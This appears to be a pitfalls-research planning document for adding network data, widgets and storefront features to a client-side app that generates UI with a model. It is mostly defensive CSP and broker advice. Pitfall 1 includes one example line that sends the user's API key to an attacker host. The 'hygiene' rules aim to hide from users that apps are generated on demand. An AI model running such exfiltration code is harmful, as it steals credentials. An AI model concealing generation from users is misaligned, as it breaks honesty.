# Pitfalls Research — Milestone v1.1 "Real & Robust"

**Domain:** Client-only generative app marketplace — ADDING a sanctioned network-data path, reliability hardening, a richer storefront, and active widget composition to a SHIPPED browser-only SPA with a `new Function` execution scope, a key-exfiltration CSP, and a devtools-hygiene gate
**Researched:** 2026-06-25
**Confidence:** HIGH for the security/CSP and CORS pitfalls (verified against the live `csp.test.ts`, `handler.ts`, `instantiate.ts`, and CSP-exfiltration / Open-Meteo sources); HIGH for the cache-key, widget, and reliability pitfalls (read directly from `cacheKey.ts`, `widgetPrewarm.ts`, `producer.ts`, `delegated.tsx`); MEDIUM where a failure mode depends on what the model produces at runtime.

> **Scope note.** `.planning/codebase/CONCERNS.md` documents an unrelated `make-doc.py` PDF script and has no bearing on v1.1; it was reviewed and excluded. Every pitfall below is specific to ADDING the four v1.1 features to THIS system, not generic web-app advice. The prior `PITFALLS.md` (dated 2026-06-24) is the v1.0 milestone research and is left intact.

---

## Critical Pitfalls

### Pitfall 1: Broadening CSP `connect-src` to let network apps fetch — turning the policy into a key-exfiltration highway

**What goes wrong:**
The current CSP is the single thing standing between a hallucinated/hostile generated component and the user's Anthropic key: `connect-src 'self' https://api.anthropic.com` (in `index.html`, guarded by `csp.test.ts`). The obvious-but-wrong way to let a Weather app fetch real data is to widen `connect-src` — to `https://api.open-meteo.com`, to a list of data domains, or (worst) to `https:` / `*`. The moment you do, you have ALSO authorized generated code to `fetch("https://attacker.example/?k=" + localStorage.getItem('anthropic-key'))`. Because generated code runs in a `new Function` scope that is containment-by-convention, not a boundary (it can still reach ambient `window`/`localStorage` — see `instantiate.ts` header; only the handler scope shadows globals), the CSP `connect-src` allowlist is the de-facto exfiltration boundary for the key. Any domain you add is a domain the key can be shipped to. The CSP-bypass literature is explicit: "any use of wildcard will lead to data exfiltration," and even a single over-broad entry is an open AJAX channel for an injected/hallucinated payload.

**Why it happens:**
The egress restriction lives in the handler scope today (`DENIED_GLOBALS` shadows `fetch`), so the "let it fetch" instinct is to remove that restriction and widen CSP to match. That couples "the app can read its data" with "the app can post anywhere," which are different privileges. Developers also under-weight the threat model because the README says "it's the user's own key generating UI for the same user" — but a single hallucinated URL, a prompt-injected data source, or a copy-pasted malicious app type defeats that assumption, and the cost is the user's live API credential.

**How to avoid:**
Do NOT broaden `connect-src` and do NOT un-shadow `fetch` in the generated/handler scope. Instead introduce a **host-brokered fetch** behind a hard **allowlist**:
- Keep `fetch`/`XMLHttpRequest` shadowed to `undefined` in both the handler scope (`DENIED_GLOBALS`) and the component scope. Generated code never calls `fetch` directly.
- Inject a new capability — e.g. `runNetwork(source, params)` or extend the handler `services` with a `netFetch` — that the HOST owns. The host validates the requested source against a small **static allowlist of keyless, CORS-enabled, read-only data origins** (e.g. `api.open-meteo.com`, an FX-rates host), performs the fetch itself, and returns only parsed data to the generated scope.
- The host fetch helper must (a) accept only an allowlisted origin (reject everything else, returning a neutral `{ error }`), (b) build the URL from validated params rather than echoing a model-supplied full URL, (c) NEVER attach the Anthropic key or any header to the data request, and (d) NEVER be reachable for an arbitrary origin even via string trickery (validate the parsed `new URL(...).origin`, not a substring match).
- CSP then expands by exactly the allowlisted data origins AND ONLY because the HOST — not generated code — is the only caller. The key is still unreachable because the broker never sends it and the generated scope still cannot call `fetch` at all. Update `csp.test.ts` to assert the new `connect-src` is exactly `'self' https://api.anthropic.com <allowlisted-data-origins…>` and that no wildcard / `https:` / `http:` token ever appears.
- Add a test that proves generated/handler code calling bare `fetch` gets `undefined` (the shadow holds) and that the broker rejects a non-allowlisted origin.

**Warning signs:**
- A PR diff that changes the `connect-src` line in `index.html` without a corresponding allowlist-validation broker.
- `fetch` removed from `DENIED_GLOBALS`, or a component-scope param list that newly injects `fetch`.
- The string `https:`, `http:`, or `*` appearing anywhere in the CSP `connect-src`.
- A broker that takes a full URL string from the model instead of (source-id, params).

**Phase to address:**
The **Sanctioned network-data path** phase (Feature A). The broker-and-allowlist pattern IS the feature, not an add-on.

---

### Pitfall 2: CORS failures from keyless public APIs degrading every network app to the silent fallback

**What goes wrong:**
The reason network apps "degrade to a fallback" today is the handler scope has no `fetch`. Even after adding a broker, the chosen data sources can fail CORS: many "free" public APIs either (a) require an API key, (b) do NOT send `Access-Control-Allow-Origin`, or (c) send it only for some endpoints. A browser-direct `fetch` to such a host is rejected at the CORS preflight/response stage with an opaque network error — and because the system maps all data failures to a neutral `{ error }` (hygiene), the app silently shows stale/fallback content with no signal to the developer that the source was simply unreachable from the browser. You ship "real data," it works in a Node test (no CORS), and it's broken for every actual user.

**Why it happens:**
CORS is a browser-only constraint; it is invisible in `fetch`-mocked unit tests and in any server-side reproduction. The temptation is to pick a familiar API (OpenWeatherMap, a finance API) that needs a key or isn't CORS-open, because the developer tested it with curl. The hygiene rule (no mechanic leak → all failures neutral) then HIDES the CORS failure behind the same `{ error }` that a genuine produce failure uses.

**How to avoid:**
- Curate the allowlist to **keyless, explicitly-CORS-enabled** sources only. Open-Meteo is the canonical fit: no API key, no sign-up, CORS supported out of the box, 10k req/day free, stable `https://api.open-meteo.com/v1/forecast`. Pick equivalents for currency/FX with the same properties; verify each sends `Access-Control-Allow-Origin: *` from the browser BEFORE adding it (a one-off browser-console check, recorded in the allowlist's source comment).
- Treat "is this source reachable from a browser with CORS" as an acceptance criterion for adding ANY data origin, with the verification noted next to the entry.
- Give the broker a DIFFERENTIATED internal error (gated logger only) for CORS/network failure vs. a parse failure vs. an allowlist rejection — so the developer can tell from logs why an app degraded, while the user still sees neutral copy. Do NOT surface the distinction to the UI (hygiene), but DO surface it to the gated logger and tests.
- Add an integration test per allowlisted source that asserts a real-shape response parses, plus a documented manual browser smoke-check (CORS can't be asserted in jsdom).

**Warning signs:**
- A data source on the allowlist that requires `?appid=` / `?apikey=` / an `Authorization` header.
- Network apps that "work in tests" but show fallback content in the live browser.
- A broker whose only error path is the same neutral `{ error }` with no internal CORS-vs-parse discrimination in logs.

**Phase to address:**
The **Sanctioned network-data path** phase (Feature A) — allowlist curation and per-source CORS verification are part of building it.

---

### Pitfall 3: An app (or the model) wanting its OWN third-party API key — reintroducing a credential to store, leak, and exfiltrate

**What goes wrong:**
A produced network app for, say, premium weather or a stock ticker "wants" an API key for its data source. If the system grows any path to store/pass a per-app third-party key, it (a) adds a second secret to the localStorage attack surface, (b) tempts a broadened CSP to reach that key's host, and (c) gives generated code a credential to exfiltrate — multiplying Pitfall 1. The model may even hallucinate `const API_KEY = "..."` or prompt the user for one inside generated UI.

**Why it happens:**
"Real data" feels like it implies "real (often keyed) APIs." The path of least resistance is to let the app carry a key the way the platform carries the Anthropic key — but the platform's single-key model is exactly what makes the hygiene/exfiltration story tractable.

**How to avoid:**
- **Hard product constraint: keyless data sources ONLY.** The allowlist contains only no-auth, CORS-open origins (Pitfall 2). There is no mechanism to store or pass a third-party API key — its absence is the mitigation.
- The network-broker prompt for the model must state "no API key, no auth — these sources need none" so the model never generates key-handling code; and the broker must strip/ignore any `apikey`/`Authorization` the model tries to pass.
- If a desirable source needs a key, it does not go on the allowlist — find a keyless equivalent or drop that app type. Document this boundary in PROJECT.md "Out of Scope" alongside "no key proxy."

**Warning signs:**
- Any new localStorage entry that looks like a credential other than the one Anthropic key.
- A KeyDialog-like UI being generalized to "data source keys."
- Generated source containing `apiKey`, `appid`, `Authorization`, or a hard-coded token.

**Phase to address:**
The **Sanctioned network-data path** phase (Feature A) — encode "keyless only" as an explicit non-goal at design time, not after an app asks for a key.

---

### Pitfall 4: Cache-key collisions once widgets activate — the latent `kind`/`prompt` folding finally bites

**What goes wrong:**
The system already HAS the correct fix in `registryKey(kind, type, prompt)` (it folds `kind` + normalized `prompt` into the SHA-256, separated by U+001F so `type "a"` + `prompt "b"` can't collide with `type "a b"`). The danger is in the call sites that DON'T use it consistently. Right now `resolveWidget` and the widget pre-warm key on `registryKey("widget", widgetType)` with NO prompt, while a widget TWEAK keys on `registryKey("widget", widgetType, instruction)`. If activated widget composition introduces a path that (a) keys a widget with the bare type while a same-slug app is keyed `registryKey("app", type)` — these are already distinct because `kind` differs, good — but (b) any code that still calls the low-level `cacheKey(type)` (the `SHA-256(type)`-only primitive flagged in PROJECT.md as the latent G1 risk), OR any path that drops the prompt when a prompt-variant was intended, will serve the WRONG cached artifact: a widget variant collides with the baseline, or a tweak re-serves the un-tweaked version, or two different prompts map to one key.

**Why it happens:**
The widget path was dormant; when it activates, new call sites get written and it's easy to reach for the simpler `cacheKey(input)` primitive or to forget the `prompt` argument. The `kind` discriminator only protects app-vs-widget-vs-handler; WITHIN `kind`, the `type`+`prompt` pair is the whole identity, and a dropped `prompt` silently aliases distinct artifacts.

**How to avoid:**
- Audit EVERY key derivation when activating widgets: every read AND write for an artifact must go through `registryKey(kind, type, prompt)` with the SAME arguments. A read that omits the prompt a write included is a guaranteed miss-then-overwrite (or wrong hit).
- Treat the low-level `cacheKey(input)` primitive as internal-only; grep for its call sites and confirm none key a registry artifact directly. Consider marking it `@internal`.
- Fully fold `kind` + a normalized prompt hash into the key for activated widgets and tweak variants (PROJECT.md G1-followups / G3). Add tests: (1) an app and a widget sharing the slug `"chart"` get distinct keys; (2) a widget and its tweak variant get distinct keys; (3) the same (kind,type,prompt) is stable across read/write; (4) two different prompts never collide.
- Because `normalizePart` lowercases, trims, and collapses whitespace, also test that prompts differing only in case/whitespace intentionally share a key (confirm that's wanted) and prompts differing in meaningful tokens don't.

**Warning signs:**
- A widget tweak that "doesn't take" (re-shows the original) — a dropped-prompt read hitting the baseline.
- A widget rendering an app's content or vice versa (would require a `kind` bug — high severity).
- Any new `cacheKey(` call in a registry read/write path.
- Asymmetric key args between the `get` and the `put` for the same artifact.

**Phase to address:**
The **Activate widget composition** phase (Feature D) — key-correctness is a precondition for activating the path, and G1-followups/G3 are explicitly that phase's scope.

---

### Pitfall 5: Regressing the currently-dormant widget path when activating it

**What goes wrong:**
The widget machinery (`widgetPrewarm.ts`, `widgetParse.ts`, `instantiate.ts`'s `useWidget`, `WidgetShell`, `WidgetErrorBoundary`) is BUILT and tested but DORMANT — delegated apps never emit `// @widget`. Activating it means the app prompt now invites `// @widget chart` declarations (the app prompt already mentions this — `producer.ts` lines 199-201), so the previously-unexercised pre-warm/instantiate/isolate path goes live for the first time on REAL model output. Latent bugs that 368 green tests never hit (because no test drove a real declared-widget app end-to-end against a delegated shell) surface in production: the delegated path instantiates via `instantiateDelegated`, which injects only `module/exports/React/require` and does NOT inject `useWidget`, while the monolithic `instantiate` path DOES inject `useWidget`. The two execution paths have DIFFERENT scopes; activating widgets in the wrong one is a silent break (a delegated `view` that calls `useWidget` throws "useWidget is not defined").

**Why it happens:**
The pivot to the delegated thin-shell (v1.1) made handlers the primary behavior path, but widget pre-warm was wired for the MONOLITHIC `instantiate` scope (which injects `useWidget`). `instantiateDelegated` does NOT. "Activate widgets" can mean "let delegated apps use widgets," but the delegated view function has no `useWidget` in scope — so an unconsidered activation either targets the legacy monolithic path (works, but that path is now the fallback) or needs `instantiateDelegated` extended to inject and pre-warm widgets.

**How to avoid:**
- Decide explicitly WHICH execution path composes widgets: the monolithic `instantiate` (already wired for `useWidget` + pre-warm) or the delegated `DelegatedShell`/`instantiateDelegated` (currently has no widget injection). If it's the delegated path, `instantiateDelegated` must be extended to (a) accept a pre-warmed widget map, (b) inject `useWidget` into its scope, and (c) have its `view(state)` able to call it — a non-trivial change to a load-bearing runtime.
- Write end-to-end tests that drive a REAL `// @widget`-declaring app through the chosen path with a canned transport returning a widget-using component AND a sub-widget — the integration the dormant path never had.
- Keep the change behind the existing seams; do NOT alter the delegated fallback contract (a delegated module that can't instantiate must still fall back to monolithic).
- Run the FULL existing suite (368 tests) and confirm zero regressions — the user's profile flags regression as a top frustration; this is the highest-regression-risk feature.

**Warning signs:**
- A delegated app emitting `useWidget` and throwing "useWidget is not defined" (scope mismatch).
- Pre-warm running for a path that never reads the resulting map.
- Any existing widget/delegated test going red.

**Phase to address:**
The **Activate widget composition** phase (Feature D) — with an explicit "which scope" design decision up front and an end-to-end regression gate.

---

### Pitfall 6: Self-heal loops and reliability validators that never converge — or that reject working apps

**What goes wrong:**
Feature B (reliability hardening) tightens the contract on produced reducers/handlers (stronger action-spec, validation, self-heal on bad transitions). Two opposite failure modes:
1. **Over-constraining → nothing produces.** Pile too many MUST/CRITICAL/EXACT requirements into the prompt and Haiku (a small, cheap model) can't satisfy them all at once; every attempt fails the validator, the self-heal loop burns its 3 attempts (`MAX_ATTEMPTS`), and the app degrades to fallback MORE often than before "hardening."
2. **Validation false-positives → working apps rejected.** A post-produce validator that's stricter than reality (e.g. "state must be EXACTLY these keys") rejects a correct handler that added a harmless field, or a reducer that returns a valid superset — breaking apps that worked in v1.0.
3. **Non-converging self-heal.** The current loop already early-stops on two identical consecutive errors (`producer.ts`). A new "bad transition" self-heal that feeds a RUNTIME (not compiler) error back can loop without converging because runtime-state errors are less actionable than Babel errors (the project's own resilience principle: feed the COMPILER error, not the runtime error). Each non-converging attempt is a full model round-trip — latency and cost (the produce-gate sliding-window cap, RESIL-05, starts throttling).

**Why it happens:**
"Make it more reliable" reads as "constrain it harder" and "validate more," but a small model has a complexity budget and a strict validator has a false-positive budget. Adding round-trips to fix state-machine quirks fights the resilience budget (≈3 attempts) and the cost cap that protect the core loop.

**How to avoid:**
- Prefer **structural contracts the model can actually hit** over volume of rules: the delegated design ALREADY makes the shell the single source of truth and embeds the state shape into every stable intent (`buildActionIntent`) — lean on that (carry the shape, validate the RETURNED shape, keep-prior on mismatch) rather than adding prose constraints. `DelegatedShell` already does `{ ...prev, ...next }` merge + keep-prior on bad/empty result — extend THAT gatekeeping, which never needs a model round-trip.
- Make validation **shape-tolerant**: validate that returned state is a superset-compatible object and merge-keep-prior on violation (no re-produce), instead of rejecting. A false-positive that keeps prior state is invisible; a false-positive that re-produces or blanks the app is a regression.
- Reserve self-heal round-trips for COMPILE errors (actionable), not runtime state quirks (handle those with merge/keep-prior at runtime, zero round-trips). Keep `MAX_ATTEMPTS` bounded and the identical-error early-stop.
- Budget the cost: any new round-trip path must consult the existing `produceGate` and have a hard attempt cap; measure that "hardening" does not REDUCE the produce success rate or blow the cost cap.

**Warning signs:**
- Produce success rate DROPS after hardening (more fallbacks than v1.0).
- The produce gate throttling more often.
- A validator that re-produces on a state-shape mismatch instead of keeping prior state.
- Self-heal feeding runtime (not compiler) errors back into the model.

**Phase to address:**
The **Reliability hardening** phase (Feature B) — the success metric must be "produced behavior correct MORE often AND produce-success not lower," measured against captured fixtures.

---

## Moderate / UX Pitfalls

### Pitfall 7: Stale, misleading, or runaway "popularity" from a local-only `useCount`

**What goes wrong:**
`useCount` exists for LRU eviction (RESIL-06) and is bumped on every cache hit (apps AND handlers — see `touchHandler`). Feature C surfaces a "popular on the platform" row from it. Three problems:
1. **"Popular on the platform" is a lie.** The count is LOCAL to this one browser/IndexedDB — there is no cross-user signal (multi-user sync is explicitly Out of Scope). A user sees "popular on the platform" reflecting only their own usage. That's misleading copy at best and, for a fresh install, an EMPTY or arbitrary row.
2. **`useCount` is overloaded.** It's incremented by the LRU touch on cache hits, including widget/handler internal resolutions — so "popularity" may count machinery, not user opens. A handler bumped on every action would dominate a naive "most used" row.
3. **Drift / cold start.** A brand-new browser has all-zero counts; the popular row is empty or shows seed apps only.

**How to avoid:**
- Use neutral, TRUE copy: "Recently opened" / "Your most-used" — never "popular on the platform" (false) and never anything implying other users (Out of Scope + privacy).
- Drive the row from a USER-OPEN signal, not the LRU touch: count storefront opens of an APP specifically, not every cache hit / handler resolution. Either a separate `openCount` field or a filter to `kind === 'app'` opens. Don't reuse the eviction counter as the popularity signal without scoping it.
- Handle cold start: hide the row (or fall back to seeds/curated order) until there are enough opens to be meaningful.
- Privacy: the usage signal stays in IndexedDB, never leaves the browser (it can't — no server), and the row's copy must not imply it's shared. No new egress.

**Warning signs:**
- Copy containing "platform"/"everyone"/"trending" with a local-only count.
- A handler or widget topping the "popular apps" row.
- An empty/odd popular row on a fresh profile.

**Phase to address:**
The **Richer storefront** phase (Feature C).

---

### Pitfall 8: `displayName` / `prompt` persistence drift — the storefront and re-produce disagree

**What goes wrong:**
Feature C persists `displayName` and `prompt` (G5) for a faithful re-produce and a richer storefront. Drift modes:
1. **Key vs. display divergence.** The cache KEY folds a NORMALIZED prompt (NFC, lowercased, whitespace-collapsed — `normalizePart`). If the STORED `prompt` for re-produce is the normalized one, re-produce loses the user's original casing/wording; if it's the raw one, two records can share a key but differ in stored prompt → which display name wins? The displayed name and the key-determining prompt must be tracked as DISTINCT fields.
2. **Tweak naming.** A tweak produces a NEW key from (type + instruction). Its `displayName` must reflect the tweak, or the storefront shows two identical names for two different cached artifacts (the baseline and the tweak).
3. **Missing-field reads.** Existing v1.0 records have NO `displayName`/`prompt` (trimmed for MVP). Reading the new fields without a fallback shows blank cards for everything created before the migration.

**How to avoid:**
- Store BOTH a raw `prompt` (for faithful re-produce) and rely on `registryKey` to normalize for the key — never reconstruct the key from a display string. Keep `displayName` a separate, user-facing field.
- Backfill / tolerate absent fields: every read of `displayName`/`prompt` must fall back to the type slug / a derived label so pre-migration records render.
- Give tweak variants a distinct derived `displayName`.

**Warning signs:**
- Blank or duplicated card titles after enabling the storefront row.
- A re-produced app coming back subtly different because the stored prompt was the normalized form.

**Phase to address:**
The **Richer storefront** phase (Feature C), with a read-tolerance check that pre-G5 records still render.

---

### Pitfall 9: Rate-limit abuse & runaway fetches via the network path

**What goes wrong:**
A produced app that polls (`setInterval`/`useEffect` without cleanup) or fetches on every render can hammer a keyless source. Open-Meteo's free tier is 10k/day — a tight loop blows it, gets the user IP-throttled, and every network app then degrades. Unlike model calls (gated by `produceGate` + token-bucket, RESIL-02/05), the NEW data-fetch path has NO budget unless you add one.

**How to avoid:**
- Put the data fetch behind the HOST broker (Pitfall 1) and give the broker its OWN throttle: a token-bucket / min-interval per source, plus a per-session request cap, mirroring `tokenBucket.ts`/`produceGate.ts`. Generated code can't call `fetch` directly (it's shadowed), so the broker is the only egress and the only place to enforce the budget — by construction.
- Debounce/cache data responses briefly (a short-TTL in-memory cache keyed by source+params) so a re-rendering app doesn't refetch identical data.
- Prompt guidance: tell the model the data helper is for on-demand/effect-driven fetches, not polling.

**Warning signs:**
- A burst of identical data requests in the Network tab.
- A source returning 429 to the broker.
- A network app with a `setInterval` and no clear-on-unmount.

**Phase to address:**
The **Sanctioned network-data path** phase (Feature A) — the broker's throttle is part of the broker.

---

### Pitfall 10: Hygiene leak via the network path — the DATA fetch is fine, but the PROMPT/mechanic must stay hidden

**What goes wrong:**
A weather app's `GET https://api.open-meteo.com/...` in the Network tab is NOT a hygiene leak — it's the app's own data, exactly what a "real" weather app would do, and reveals nothing about on-demand generation. The leak risk is elsewhere: (a) the broker or data-path naming/logging using mechanic-revealing tokens (the banned "synthesi*" family, or any token the gate bans) visible in source, console, or a request; (b) a data request that travels ALONGSIDE the model POST in a way that correlates them; (c) the new network-prompt text for the model leaking the mechanic into a comment or string that the `hygiene.test.ts` lexicon gate would (must) catch; (d) an error from the data path that narrates "we generated a handler that couldn't fetch."

**How to avoid:**
- Keep the data fetch and the model call on SEPARATE, unrelated-looking paths. The data fetch looks like any app's API call; the model call is the only `api.anthropic.com` POST (already isolated).
- Run all new strings (broker, network prompt, error copy) through the existing `hygiene.test.ts` lexicon gate — extend the test to cover the new files. Error copy from the network path must be neutral ("This data could not be loaded") with no mechanic narration.
- Neutral naming for the broker/store/log surfaces (HYGIENE-04 discipline).

**Warning signs:**
- The lexicon gate going red on a new network file.
- Console logs that narrate the data-handler mechanic.
- Error copy mentioning generation/handlers/on-demand.

**Phase to address:**
The **Sanctioned network-data path** phase (Feature A), gated by the existing `hygiene.test.ts` extended to the new surfaces.

---

### Pitfall 11: Widget render waterfalls, cycles, and unbounded fan-out when composition goes live

**What goes wrong:**
`prewarmWidgets` already guards the two classic failures — a cycle guard (`seen` set, so A→B→A terminates) and a concurrency cap of 2 with a transitive worklist (so it's not a serial waterfall and not a request storm). The risk in ACTIVATING is exceeding the design's assumptions: the app prompt caps declared widgets at two (`producer.ts` line 200: "at most two"), but a real model can emit more, or a chain of widgets each declaring more can fan out a large transitive tree — every node an eager produce on a cache miss, each a model round-trip, each consulting the produce gate. First-paint latency balloons and the produce gate throttles mid-pre-warm, leaving a half-resolved widget map (isolated failures show placeholders — acceptable, but the app looks broken).

**How to avoid:**
- Enforce the two-widget cap in CODE, not just the prompt: `parseWidgetDeps` (or the pre-warm enqueue) should bound the number of distinct widgets pre-warmed per app and the transitive depth, so a runaway declaration tree can't fan out unbounded model calls.
- Keep the concurrency cap (2) and the cycle guard — they're correct; just verify they hold under a deeper tree than the dormant tests exercised.
- Accept partial resolution gracefully (already done via WIDGET-05 placeholders) but ensure a half-resolved app from gate-throttling is visibly coherent, not a grid of placeholders.

**Warning signs:**
- An app declaring 3+ widgets, or a widget chain expanding to many produces.
- The produce gate throttling DURING a single app open.
- First paint of a widget app noticeably slower than a plain app.

**Phase to address:**
The **Activate widget composition** phase (Feature D).

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Widen `connect-src` to data domains instead of host-brokering | One-line change; apps fetch immediately | The user's Anthropic key becomes exfiltratable to any added domain; defeats the project's only key-containment boundary | **Never** — the broker+allowlist is the feature |
| Un-shadow `fetch` in the generated/handler scope | Generated code fetches directly, no broker to build | Generated code gains arbitrary egress within CSP; couples "read data" with "post anywhere" | **Never** |
| Reuse the LRU `useCount` directly as the popularity signal | No new field; row ships fast | Counts machinery (handler/widget touches) and LRU bumps, not user opens; misleading row | Only as a v1 placeholder IF copy is "recently used" and a real `openCount` is a fast follow |
| Add prose constraints to the produce prompt to "harden" reliability | Feels like more reliability | Small model can't satisfy all → MORE fallbacks; fights the resilience/cost budget | Only with a measured produce-success guardrail |
| Activate widgets in the monolithic path and call the delegated path "later" | Reuses the already-wired `useWidget`+pre-warm scope | The delegated thin-shell is now the DEFAULT path; widgets that only work in the fallback path aren't really activated | Acceptable as an explicit, documented first step IF the delegated-path plan is tracked |
| Store the normalized prompt as the re-produce prompt | One field for key + display + re-produce | Re-produce loses the user's wording/casing; key and display conflated | Never — keep raw prompt + normalize only for the key |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Keyless public data API (Open-Meteo, FX) | Pick a familiar API that needs a key or isn't CORS-open; test with curl, ship broken in browser | Allowlist only verified keyless + CORS-`*` origins; verify CORS from a real browser before adding; record the check next to the entry |
| CSP `connect-src` | Add the data origin AND let generated code call `fetch` | Add the data origin ONLY because the HOST broker is the sole caller; keep `fetch` shadowed in generated scope; `csp.test.ts` asserts no wildcard |
| `registryKey` for activated widgets | Read with `(kind,type)` but write with `(kind,type,prompt)` (or use the bare `cacheKey` primitive) | Symmetric `registryKey(kind,type,prompt)` on every read AND write; `cacheKey` primitive is internal-only |
| `instantiateDelegated` + widgets | Assume it injects `useWidget` like `instantiate` does — it doesn't | Decide the composing path explicitly; extend `instantiateDelegated` to inject a pre-warmed widget map if widgets compose in the delegated path |
| Anthropic model call vs. data fetch | Let the two egresses correlate / share naming | Keep them separate; only `api.anthropic.com` is the model POST; data fetch looks like any app API call |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Runaway/polling data fetch | Burst of identical requests; source 429s | Broker-side throttle (token-bucket/min-interval) + short-TTL response cache; `fetch` shadowed so broker is the only egress | First polling app, or first app that fetches on every render |
| Widget fan-out on cache miss | Slow first paint; produce gate throttles mid-open; grid of placeholders | Code-enforced ≤2 widgets + bounded transitive depth; keep concurrency cap 2 | First app the model gives 3+ widgets or a deep widget chain |
| Extra self-heal round-trips for runtime quirks | Higher latency; produce gate throttling; lower produce-success | Handle state quirks at runtime (merge/keep-prior, zero round-trips); reserve self-heal for compile errors | When "reliability hardening" adds runtime-error self-heal |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Broaden CSP `connect-src` to enable data fetch | Generated code exfiltrates the Anthropic key to any added/wildcard domain | Host-brokered fetch + static allowlist; `fetch` stays shadowed; `csp.test.ts` bans wildcard/`https:` and pins the exact origin set |
| Broker accepts a model-supplied full URL | SSRF-style exfiltration to an arbitrary host that happens to match a substring | Build the URL from (source-id, validated params); validate `new URL(...).origin` against the allowlist, not a substring |
| Store a per-app third-party API key | Second exfiltratable secret; tempts CSP broadening | Keyless sources only; no key-storage mechanism exists; strip any auth the model emits |
| Broker forwards the Anthropic key or headers to the data host | Direct key leak to a data origin | Broker attaches NO auth/headers to data requests; key never enters the data path |
| New strings leak the mechanic | Hygiene breach (the product premise) | Extend `hygiene.test.ts` lexicon gate to all new files; neutral naming/copy/logs |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| "Popular on the platform" from a local count | Misleading; empty on fresh install | "Recently opened" / "Your most-used"; hide until meaningful |
| Network app silently shows fallback on CORS failure | Looks broken/stale with no signal | Curate CORS-verified sources; differentiate the failure in gated logs (not UI) |
| Blank/duplicate card titles after G5 | Storefront looks broken | Fallback display name for pre-migration records; distinct name for tweak variants |
| Half-resolved widget grid from gate throttling | App looks broken (grid of placeholders) | Bound widget count; ensure partial state is coherent |

## "Looks Done But Isn't" Checklist

- [ ] **Network path:** Often missing the broker+allowlist — verify generated/handler code still gets `undefined` for bare `fetch`, and `connect-src` has NO wildcard/`https:` (check `csp.test.ts`).
- [ ] **Network path:** Often missing real-browser CORS verification — verify each allowlisted source is keyless AND returns `Access-Control-Allow-Origin` from a browser (jsdom can't prove this).
- [ ] **Network path:** Often missing a fetch budget — verify the broker has its own throttle and short-TTL cache; a polling app must not blow the source's free tier.
- [ ] **Cache key:** Often missing symmetric args — verify every widget/tweak `get` and `put` uses identical `registryKey(kind,type,prompt)`; no `cacheKey(` in a registry path.
- [ ] **Widgets:** Often missing the scope decision — verify which path (`instantiate` vs `instantiateDelegated`) composes widgets and that `useWidget` is in that scope; run the full 368-test suite for regressions.
- [ ] **Widgets:** Often missing a code-level widget cap — verify a model emitting 3+ widgets or a deep chain can't fan out unbounded produces.
- [ ] **Reliability:** Often missing the success guardrail — verify produce-success rate did NOT drop after hardening (measure against captured fixtures); state quirks handled at runtime, not via extra round-trips.
- [ ] **Storefront:** Often missing honest copy + cold-start handling — verify no "platform"/"everyone" wording on a local count, and the row hides on a fresh profile.
- [ ] **Storefront:** Often missing pre-migration tolerance — verify v1.0 records without `displayName`/`prompt` still render.
- [ ] **Hygiene (all features):** Often missing gate coverage — verify `hygiene.test.ts` runs over every new file; error copy is neutral.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Shipped a broadened `connect-src` (key-exfil window) | HIGH | Revert CSP to `'self' + api.anthropic.com + allowlisted-data-origins`; re-shadow `fetch`; introduce the broker; treat any window where a wildcard shipped as a key-rotation prompt to the user |
| Cache-key collision serving wrong artifact | MEDIUM | Fix the asymmetric/`cacheKey`-primitive call site; bump a key-scheme version so stale colliding records are bypassed; clear affected stores |
| Reliability hardening lowered produce-success | MEDIUM | Roll back the over-strict prompt/validator; move state-shape handling to runtime merge/keep-prior; re-measure against fixtures |
| Widget activation regressed the suite | MEDIUM | Revert behind the seam; re-decide the composing scope; add the missing end-to-end test before re-attempting |
| Misleading popularity copy shipped | LOW | Reword to "Recently opened"; scope the count to app opens |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1. CSP broadening / key exfiltration | A — Network-data path | `csp.test.ts`: no wildcard/`https:`; `fetch` shadowed; broker rejects non-allowlisted origin |
| 2. CORS failures from keyless APIs | A — Network-data path | Per-source browser CORS check recorded; integration test parses real-shape response |
| 3. App wanting its own API key | A — Network-data path | No key-storage path; broker strips auth; "keyless only" in Out of Scope |
| 4. Cache-key collisions | D — Activate widgets | Tests: app vs widget distinct; tweak vs baseline distinct; read/write symmetric; no `cacheKey(` in registry paths |
| 5. Dormant-path regression | D — Activate widgets | End-to-end `// @widget` app test through the chosen scope; full 368-test suite green |
| 6. Self-heal non-convergence / over-constraint | B — Reliability hardening | Produce-success not lower vs fixtures; runtime merge/keep-prior; bounded attempts |
| 7. Misleading/runaway popularity | C — Richer storefront | Honest copy; app-open-scoped count; cold-start hide |
| 8. displayName/prompt drift | C — Richer storefront | Raw prompt stored; pre-G5 records render; tweak variants named distinctly |
| 9. Rate-limit / runaway fetch | A — Network-data path | Broker throttle + TTL cache; source not 429'd under a re-rendering app |
| 10. Hygiene leak via network path | A — Network-data path | `hygiene.test.ts` covers new files; neutral error copy/logs |
| 11. Widget waterfalls/cycles/fan-out | D — Activate widgets | Code-enforced widget cap + depth; cycle guard + concurrency cap hold on a deep tree |

## Sources

- Live codebase (HIGH): `index.html` CSP meta + `src/csp.test.ts` (the exact `connect-src 'self' https://api.anthropic.com`, wildcard ban, `unsafe-eval` retained); `src/execution/handler.ts` (`DENIED_GLOBALS` shadowing `fetch`/storage/DOM, neutral error, produce-gate cost cap); `src/execution/instantiate.ts` (`new Function` scope = containment-by-convention; injects `React`/`useWidget`/`runHandler`/`require`); `src/registry/cacheKey.ts` (`registryKey(kind,type,prompt)`, U+001F separator, `normalizePart`, the bare `cacheKey` primitive); `src/execution/widgetPrewarm.ts` (cycle guard, concurrency cap 2, transitive worklist, tweak keys on instruction); `src/execution/delegated.tsx` (`instantiateDelegated` scope has NO `useWidget`; `DelegatedShell` merge/keep-prior + busy gate); `src/execution/producer.ts` (3-attempt self-heal, identical-error early-stop, truncation handling, app prompt's two-widget cap + handler purity guard); `.planning/PROJECT.md` (v1.1 scope, G1-followups/G3/G5/POP-01, deferred HARD-01).
